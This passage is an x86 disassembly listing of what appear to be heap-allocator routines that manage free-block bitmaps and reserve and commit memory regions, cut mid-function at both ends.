  407cca:	03 4d e0             	add    -0x20(%ebp),%ecx
  407ccd:	0f be 51 04          	movsbl 0x4(%ecx),%edx
  407cd1:	85 d2                	test   %edx,%edx
  407cd3:	75 18                	jne    0x407ced
  407cd5:	b8 00 00 00 80       	mov    $0x80000000,%eax
  407cda:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407cdd:	d3 e8                	shr    %cl,%eax
  407cdf:	f7 d0                	not    %eax
  407ce1:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407ce4:	8b 11                	mov    (%ecx),%edx
  407ce6:	23 d0                	and    %eax,%edx
  407ce8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407ceb:	89 10                	mov    %edx,(%eax)
  407ced:	eb 6b                	jmp    0x407d5a
  407cef:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407cf2:	83 e9 20             	sub    $0x20,%ecx
  407cf5:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407cfa:	d3 ea                	shr    %cl,%edx
  407cfc:	f7 d2                	not    %edx
  407cfe:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407d01:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407d04:	8b 84 81 c4 00 00 00 	mov    0xc4(%ecx,%eax,4),%eax
  407d0b:	23 c2                	and    %edx,%eax
  407d0d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407d10:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407d13:	89 84 8a c4 00 00 00 	mov    %eax,0xc4(%edx,%ecx,4)
  407d1a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407d1d:	03 45 e0             	add    -0x20(%ebp),%eax
  407d20:	8a 48 04             	mov    0x4(%eax),%cl
  407d23:	80 e9 01             	sub    $0x1,%cl
  407d26:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407d29:	03 55 e0             	add    -0x20(%ebp),%edx
  407d2c:	88 4a 04             	mov    %cl,0x4(%edx)
  407d2f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407d32:	03 45 e0             	add    -0x20(%ebp),%eax
  407d35:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  407d39:	85 c9                	test   %ecx,%ecx
  407d3b:	75 1d                	jne    0x407d5a
  407d3d:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407d40:	83 e9 20             	sub    $0x20,%ecx
  407d43:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407d48:	d3 ea                	shr    %cl,%edx
  407d4a:	f7 d2                	not    %edx
  407d4c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407d4f:	8b 48 04             	mov    0x4(%eax),%ecx
  407d52:	23 ca                	and    %edx,%ecx
  407d54:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407d57:	89 4a 04             	mov    %ecx,0x4(%edx)
  407d5a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407d5d:	8b 48 08             	mov    0x8(%eax),%ecx
  407d60:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407d63:	8b 42 04             	mov    0x4(%edx),%eax
  407d66:	89 41 04             	mov    %eax,0x4(%ecx)
  407d69:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407d6c:	8b 51 04             	mov    0x4(%ecx),%edx
  407d6f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407d72:	8b 48 08             	mov    0x8(%eax),%ecx
  407d75:	89 4a 08             	mov    %ecx,0x8(%edx)
  407d78:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  407d7c:	0f 84 0e 01 00 00    	je     0x407e90
  407d82:	8b 55 ec             	mov    -0x14(%ebp),%edx
  407d85:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407d88:	8d 0c d0             	lea    (%eax,%edx,8),%ecx
  407d8b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407d8e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407d91:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407d94:	8b 48 04             	mov    0x4(%eax),%ecx
  407d97:	89 4a 04             	mov    %ecx,0x4(%edx)
  407d9a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407d9d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407da0:	89 42 08             	mov    %eax,0x8(%edx)
  407da3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407da6:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407da9:	89 51 04             	mov    %edx,0x4(%ecx)
  407dac:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407daf:	8b 48 04             	mov    0x4(%eax),%ecx
  407db2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407db5:	89 51 08             	mov    %edx,0x8(%ecx)
  407db8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407dbb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407dbe:	8b 50 04             	mov    0x4(%eax),%edx
  407dc1:	3b 51 08             	cmp    0x8(%ecx),%edx
  407dc4:	0f 85 c6 00 00 00    	jne    0x407e90
  407dca:	83 7d ec 20          	cmpl   $0x20,-0x14(%ebp)
  407dce:	7d 5a                	jge    0x407e2a
  407dd0:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407dd3:	03 45 ec             	add    -0x14(%ebp),%eax
  407dd6:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  407dda:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407ddd:	03 55 ec             	add    -0x14(%ebp),%edx
  407de0:	8a 42 04             	mov    0x4(%edx),%al
  407de3:	04 01                	add    $0x1,%al
  407de5:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407de8:	03 55 ec             	add    -0x14(%ebp),%edx
  407deb:	88 42 04             	mov    %al,0x4(%edx)
  407dee:	85 c9                	test   %ecx,%ecx
  407df0:	75 16                	jne    0x407e08
  407df2:	b8 00 00 00 80       	mov    $0x80000000,%eax
  407df7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407dfa:	d3 e8                	shr    %cl,%eax
  407dfc:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407dff:	8b 11                	mov    (%ecx),%edx
  407e01:	0b d0                	or     %eax,%edx
  407e03:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407e06:	89 10                	mov    %edx,(%eax)
  407e08:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407e0d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407e10:	d3 ea                	shr    %cl,%edx
  407e12:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407e15:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407e18:	8b 44 81 44          	mov    0x44(%ecx,%eax,4),%eax
  407e1c:	0b c2                	or     %edx,%eax
  407e1e:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407e21:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407e24:	89 44 8a 44          	mov    %eax,0x44(%edx,%ecx,4)
  407e28:	eb 66                	jmp    0x407e90
  407e2a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407e2d:	03 45 ec             	add    -0x14(%ebp),%eax
  407e30:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  407e34:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407e37:	03 55 ec             	add    -0x14(%ebp),%edx
  407e3a:	8a 42 04             	mov    0x4(%edx),%al
  407e3d:	04 01                	add    $0x1,%al
  407e3f:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407e42:	03 55 ec             	add    -0x14(%ebp),%edx
  407e45:	88 42 04             	mov    %al,0x4(%edx)
  407e48:	85 c9                	test   %ecx,%ecx
  407e4a:	75 1b                	jne    0x407e67
  407e4c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407e4f:	83 e9 20             	sub    $0x20,%ecx
  407e52:	b8 00 00 00 80       	mov    $0x80000000,%eax
  407e57:	d3 e8                	shr    %cl,%eax
  407e59:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  407e5c:	8b 51 04             	mov    0x4(%ecx),%edx
  407e5f:	0b d0                	or     %eax,%edx
  407e61:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407e64:	89 50 04             	mov    %edx,0x4(%eax)
  407e67:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407e6a:	83 e9 20             	sub    $0x20,%ecx
  407e6d:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407e72:	d3 ea                	shr    %cl,%edx
  407e74:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407e77:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407e7a:	8b 84 81 c4 00 00 00 	mov    0xc4(%ecx,%eax,4),%eax
  407e81:	0b c2                	or     %edx,%eax
  407e83:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407e86:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407e89:	89 84 8a c4 00 00 00 	mov    %eax,0xc4(%edx,%ecx,4)
  407e90:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  407e94:	74 14                	je     0x407eaa
  407e96:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407e99:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407e9c:	89 08                	mov    %ecx,(%eax)
  407e9e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407ea1:	03 55 f8             	add    -0x8(%ebp),%edx
  407ea4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407ea7:	89 42 fc             	mov    %eax,-0x4(%edx)
  407eaa:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407ead:	03 4d f8             	add    -0x8(%ebp),%ecx
  407eb0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407eb3:	8b 55 d8             	mov    -0x28(%ebp),%edx
  407eb6:	83 c2 01             	add    $0x1,%edx
  407eb9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407ebc:	89 10                	mov    %edx,(%eax)
  407ebe:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  407ec1:	83 c1 01             	add    $0x1,%ecx
  407ec4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407ec7:	03 55 d8             	add    -0x28(%ebp),%edx
  407eca:	89 4a fc             	mov    %ecx,-0x4(%edx)
  407ecd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ed0:	8b 08                	mov    (%eax),%ecx
  407ed2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407ed5:	8b 02                	mov    (%edx),%eax
  407ed7:	83 c0 01             	add    $0x1,%eax
  407eda:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407edd:	89 02                	mov    %eax,(%edx)
  407edf:	85 c9                	test   %ecx,%ecx
  407ee1:	75 20                	jne    0x407f03
  407ee3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407ee6:	3b 05 38 f2 45 00    	cmp    0x45f238,%eax
  407eec:	75 15                	jne    0x407f03
  407eee:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407ef1:	3b 0d 30 f2 45 00    	cmp    0x45f230,%ecx
  407ef7:	75 0a                	jne    0x407f03
  407ef9:	c7 05 38 f2 45 00 00 	movl   $0x0,0x45f238
  407f00:	00 00 00 
  407f03:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407f06:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407f09:	89 02                	mov    %eax,(%edx)
  407f0b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407f0e:	83 c0 04             	add    $0x4,%eax
  407f11:	5e                   	pop    %esi
  407f12:	8b e5                	mov    %ebp,%esp
  407f14:	5d                   	pop    %ebp
  407f15:	c3                   	ret
  407f16:	cc                   	int3
  407f17:	cc                   	int3
  407f18:	cc                   	int3
  407f19:	cc                   	int3
  407f1a:	cc                   	int3
  407f1b:	cc                   	int3
  407f1c:	cc                   	int3
  407f1d:	cc                   	int3
  407f1e:	cc                   	int3
  407f1f:	cc                   	int3
  407f20:	55                   	push   %ebp
  407f21:	8b ec                	mov    %esp,%ebp
  407f23:	51                   	push   %ecx
  407f24:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  407f29:	3b 05 2c f2 45 00    	cmp    0x45f22c,%eax
  407f2f:	75 4a                	jne    0x407f7b
  407f31:	8b 0d 2c f2 45 00    	mov    0x45f22c,%ecx
  407f37:	83 c1 10             	add    $0x10,%ecx
  407f3a:	6b c9 14             	imul   $0x14,%ecx,%ecx
  407f3d:	51                   	push   %ecx
  407f3e:	8b 15 40 f2 45 00    	mov    0x45f240,%edx
  407f44:	52                   	push   %edx
  407f45:	6a 00                	push   $0x0
  407f47:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  407f4c:	50                   	push   %eax
  407f4d:	ff 15 b4 f0 40 00    	call   *0x40f0b4
  407f53:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407f56:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  407f5a:	75 07                	jne    0x407f63
  407f5c:	33 c0                	xor    %eax,%eax
  407f5e:	e9 c8 00 00 00       	jmp    0x40802b
  407f63:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407f66:	89 0d 40 f2 45 00    	mov    %ecx,0x45f240
  407f6c:	8b 15 2c f2 45 00    	mov    0x45f22c,%edx
  407f72:	83 c2 10             	add    $0x10,%edx
  407f75:	89 15 2c f2 45 00    	mov    %edx,0x45f22c
  407f7b:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  407f80:	6b c0 14             	imul   $0x14,%eax,%eax
  407f83:	8b 0d 40 f2 45 00    	mov    0x45f240,%ecx
  407f89:	03 c8                	add    %eax,%ecx
  407f8b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407f8e:	68 c4 41 00 00       	push   $0x41c4
  407f93:	6a 08                	push   $0x8
  407f95:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  407f9b:	52                   	push   %edx
  407f9c:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  407fa2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407fa5:	89 41 10             	mov    %eax,0x10(%ecx)
  407fa8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407fab:	83 7a 10 00          	cmpl   $0x0,0x10(%edx)
  407faf:	75 04                	jne    0x407fb5
  407fb1:	33 c0                	xor    %eax,%eax
  407fb3:	eb 76                	jmp    0x40802b
  407fb5:	6a 04                	push   $0x4
  407fb7:	68 00 20 00 00       	push   $0x2000
  407fbc:	68 00 00 10 00       	push   $0x100000
  407fc1:	6a 00                	push   $0x0
  407fc3:	ff 15 08 f0 40 00    	call   *0x40f008
  407fc9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407fcc:	89 41 0c             	mov    %eax,0xc(%ecx)
  407fcf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407fd2:	83 7a 0c 00          	cmpl   $0x0,0xc(%edx)
  407fd6:	75 1a                	jne    0x407ff2
  407fd8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407fdb:	8b 48 10             	mov    0x10(%eax),%ecx
  407fde:	51                   	push   %ecx
  407fdf:	6a 00                	push   $0x0
  407fe1:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  407fe7:	52                   	push   %edx
  407fe8:	ff 15 40 f0 40 00    	call   *0x40f040
  407fee:	33 c0                	xor    %eax,%eax
  407ff0:	eb 39                	jmp    0x40802b
  407ff2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ff5:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  407ffb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407ffe:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  408005:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408008:	c7 42 08 ff ff ff ff 	movl   $0xffffffff,0x8(%edx)
  40800f:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  408014:	83 c0 01             	add    $0x1,%eax
  408017:	a3 3c f2 45 00       	mov    %eax,0x45f23c
  40801c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40801f:	8b 51 10             	mov    0x10(%ecx),%edx
  408022:	c7 02 ff ff ff ff    	movl   $0xffffffff,(%edx)
  408028:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40802b:	8b e5                	mov    %ebp,%esp
  40802d:	5d                   	pop    %ebp
  40802e:	c3                   	ret
  40802f:	cc                   	int3
  408030:	55                   	push   %ebp
  408031:	8b ec                	mov    %esp,%ebp
  408033:	83 ec 2c             	sub    $0x2c,%esp
  408036:	8b 45 08             	mov    0x8(%ebp),%eax
  408039:	8b 48 10             	mov    0x10(%eax),%ecx
  40803c:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40803f:	8b 55 08             	mov    0x8(%ebp),%edx
  408042:	8b 42 08             	mov    0x8(%edx),%eax
  408045:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408048:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  40804f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  408053:	7c 13                	jl     0x408068
  408055:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408058:	d1 e1                	shl    $1,%ecx
  40805a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40805d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  408060:	83 c2 01             	add    $0x1,%edx
  408063:	89 55 d8             	mov    %edx,-0x28(%ebp)
  408066:	eb e7                	jmp    0x40804f
  408068:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40806b:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  408071:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  408074:	8d 94 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%edx
  40807b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40807e:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  408085:	eb 09                	jmp    0x408090
  408087:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40808a:	83 c0 01             	add    $0x1,%eax
  40808d:	89 45 e0             	mov    %eax,-0x20(%ebp)
  408090:	83 7d e0 3f          	cmpl   $0x3f,-0x20(%ebp)
  408094:	7d 20                	jge    0x4080b6
  408096:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408099:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40809c:	8d 04 ca             	lea    (%edx,%ecx,8),%eax
  40809f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4080a2:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4080a5:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4080a8:	89 51 08             	mov    %edx,0x8(%ecx)
  4080ab:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4080ae:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4080b1:	89 48 04             	mov    %ecx,0x4(%eax)
  4080b4:	eb d1                	jmp    0x408087
  4080b6:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4080b9:	c1 e2 0f             	shl    $0xf,%edx
  4080bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4080bf:	8b 48 0c             	mov    0xc(%eax),%ecx
  4080c2:	03 ca                	add    %edx,%ecx
  4080c4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4080c7:	6a 04                	push   $0x4
  4080c9:	68 00 10 00 00       	push   $0x1000
  4080ce:	68 00 80 00 00       	push   $0x8000
  4080d3:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4080d6:	52                   	push   %edx
  4080d7:	ff 15 08 f0 40 00    	call   *0x40f008
  4080dd:	85 c0                	test   %eax,%eax
  4080df:	75 08                	jne    0x4080e9
  4080e1:	83 c8 ff             	or     $0xffffffff,%eax
  4080e4:	e9 31 01 00 00       	jmp    0x40821a
  4080e9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4080ec:	05 00 70 00 00       	add    $0x7000,%eax
  4080f1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4080f4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4080f7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4080fa:	eb 0c                	jmp    0x408108
  4080fc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4080ff:	81 c2 00 10 00 00    	add    $0x1000,%edx
  408105:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408108:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40810b:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40810e:	77 5d                	ja     0x40816d
  408110:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408113:	c7 41 08 ff ff ff ff 	movl   $0xffffffff,0x8(%ecx)
  40811a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40811d:	c7 82 fc 0f 00 00 ff 	movl   $0xffffffff,0xffc(%edx)
  408124:	ff ff ff 
  408127:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40812a:	83 c0 0c             	add    $0xc,%eax
  40812d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  408130:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408133:	c7 01 f0 0f 00 00    	movl   $0xff0,(%ecx)
  408139:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40813c:	81 c2 00 10 00 00    	add    $0x1000,%edx
  408142:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408145:	89 50 04             	mov    %edx,0x4(%eax)
  408148:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40814b:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  408151:	8b 55 e8             	mov    -0x18(%ebp),%edx
  408154:	89 4a 08             	mov    %ecx,0x8(%edx)
  408157:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40815a:	05 ec 0f 00 00       	add    $0xfec,%eax
  40815f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408162:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408165:	c7 01 f0 0f 00 00    	movl   $0xff0,(%ecx)
  40816b:	eb 8f                	jmp    0x4080fc
  40816d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408170:	81 c2 f8 01 00 00    	add    $0x1f8,%edx
  408176:	89 55 ec             	mov    %edx,-0x14(%ebp)
  408179:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40817c:	83 c0 0c             	add    $0xc,%eax
  40817f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408182:	89 41 04             	mov    %eax,0x4(%ecx)
  408185:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408188:	8b 42 04             	mov    0x4(%edx),%eax
  40818b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40818e:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408191:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408194:	89 51 08             	mov    %edx,0x8(%ecx)
  408197:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40819a:	83 c0 0c             	add    $0xc,%eax
  40819d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4081a0:	89 41 08             	mov    %eax,0x8(%ecx)
  4081a3:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4081a6:	8b 42 08             	mov    0x8(%edx),%eax
  4081a9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4081ac:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4081af:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4081b2:	89 51 04             	mov    %edx,0x4(%ecx)
  4081b5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4081b8:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4081bb:	c7 44 81 44 00 00 00 	movl   $0x0,0x44(%ecx,%eax,4)
  4081c2:	00 
  4081c3:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4081c6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4081c9:	c7 84 90 c4 00 00 00 	movl   $0x1,0xc4(%eax,%edx,4)
  4081d0:	01 00 00 00 
  4081d4:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4081d7:	0f be 51 43          	movsbl 0x43(%ecx),%edx
  4081db:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4081de:	8a 48 43             	mov    0x43(%eax),%cl
  4081e1:	80 c1 01             	add    $0x1,%cl
  4081e4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4081e7:	88 48 43             	mov    %cl,0x43(%eax)
  4081ea:	85 d2                	test   %edx,%edx
  4081ec:	75 0f                	jne    0x4081fd
  4081ee:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4081f1:	8b 51 04             	mov    0x4(%ecx),%edx
  4081f4:	83 ca 01             	or     $0x1,%edx
  4081f7:	8b 45 08             	mov    0x8(%ebp),%eax
  4081fa:	89 50 04             	mov    %edx,0x4(%eax)
  4081fd:	ba 00 00 00 80       	mov    $0x80000000,%edx
  408202:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  408205:	d3 ea                	shr    %cl,%edx
  408207:	f7 d2                	not    %edx
  408209:	8b 45 08             	mov    0x8(%ebp),%eax
  40820c:	8b 48 08             	mov    0x8(%eax),%ecx
  40820f:	23 ca                	and    %edx,%ecx
  408211:	8b 55 08             	mov    0x8(%ebp),%edx
  408214:	89 4a 08             	mov    %ecx,0x8(%edx)
  408217:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40821a:	8b e5                	mov    %ebp,%esp
  40821c:	5d                   	pop    %ebp
  40821d:	c3                   	ret
  40821e:	cc                   	int3
  40821f:	cc                   	int3
  408220:	55                   	push   %ebp
  408221:	8b ec                	mov    %esp,%ebp
  408223:	81 ec 68 01 00 00    	sub    $0x168,%esp
  408229:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  40822e:	6b c0 14             	imul   $0x14,%eax,%eax
  408231:	50                   	push   %eax
  408232:	8b 0d 40 f2 45 00    	mov    0x45f240,%ecx
  408238:	51                   	push   %ecx
  408239:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  40823f:	85 c0                	test   %eax,%eax
  408241:	74 08                	je     0x40824b
  408243:	83 c8 ff             	or     $0xffffffff,%eax
  408246:	e9 ee 05 00 00       	jmp    0x408839
  40824b:	8b 15 40 f2 45 00    	mov    0x45f240,%edx
  408251:	89 95 c4 fe ff ff    	mov    %edx,-0x13c(%ebp)
  408257:	c7 85 e0 fe ff ff 00 	movl   $0x0,-0x120(%ebp)
  40825e:	00 00 00 
  408261:	eb 0f                	jmp    0x408272
  408263:	8b 85 e0 fe ff ff    	mov    -0x120(%ebp),%eax
  408269:	83 c0 01             	add    $0x1,%eax
  40826c:	89 85 e0 fe ff ff    	mov    %eax,-0x120(%ebp)
  408272:	8b 8d e0 fe ff ff    	mov    -0x120(%ebp),%ecx
  408278:	3b 0d 3c f2 45 00    	cmp    0x45f23c,%ecx
  40827e:	0f 8d b3 05 00 00    	jge    0x408837
  408284:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  40828a:	8b 42 10             	mov    0x10(%edx),%eax
  40828d:	89 85 a0 fe ff ff    	mov    %eax,-0x160(%ebp)
  408293:	68 c4 41 00 00       	push   $0x41c4
  408298:	8b 8d a0 fe ff ff    	mov    -0x160(%ebp),%ecx
  40829e:	51                   	push   %ecx
  40829f:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  4082a5:	85 c0                	test   %eax,%eax
  4082a7:	74 0a                	je     0x4082b3
  4082a9:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4082ae:	e9 86 05 00 00       	jmp    0x408839
  4082b3:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  4082b9:	8b 42 0c             	mov    0xc(%edx),%eax
  4082bc:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
  4082c2:	8b 8d a0 fe ff ff    	mov    -0x160(%ebp),%ecx
  4082c8:	81 c1 44 01 00 00    	add    $0x144,%ecx
  4082ce:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4082d1:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  4082d7:	8b 42 08             	mov    0x8(%edx),%eax
  4082da:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4082dd:	c7 85 bc fe ff ff 00 	movl   $0x0,-0x144(%ebp)
  4082e4:	00 00 00 
  4082e7:	c7 85 a8 fe ff ff 00 	movl   $0x0,-0x158(%ebp)
  4082ee:	00 00 00 
  4082f1:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4082f8:	eb 09                	jmp    0x408303
  4082fa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4082fd:	83 c1 01             	add    $0x1,%ecx
  408300:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408303:	83 7d f4 20          	cmpl   $0x20,-0xc(%ebp)
  408307:	0f 8d ee 04 00 00    	jge    0x4087fb
  40830d:	c7 85 e4 fe ff ff 00 	movl   $0x0,-0x11c(%ebp)
  408314:	00 00 00 
  408317:	c7 85 b0 fe ff ff 00 	movl   $0x0,-0x150(%ebp)
  40831e:	00 00 00 
  408321:	c7 85 d4 fe ff ff 00 	movl   $0x0,-0x12c(%ebp)
  408328:	00 00 00 
  40832b:	c7 85 b4 fe ff ff 00 	movl   $0x0,-0x14c(%ebp)
  408332:	00 00 00 
  408335:	eb 0f                	jmp    0x408346
  408337:	8b 95 b4 fe ff ff    	mov    -0x14c(%ebp),%edx
  40833d:	83 c2 01             	add    $0x1,%edx
  408340:	89 95 b4 fe ff ff    	mov    %edx,-0x14c(%ebp)
  408346:	83 bd b4 fe ff ff 40 	cmpl   $0x40,-0x14c(%ebp)
  40834d:	7d 13                	jge    0x408362
  40834f:	8b 85 b4 fe ff ff    	mov    -0x14c(%ebp),%eax
  408355:	c7 84 85 e8 fe ff ff 	movl   $0x0,-0x118(%ebp,%eax,4)
  40835c:	00 00 00 00 
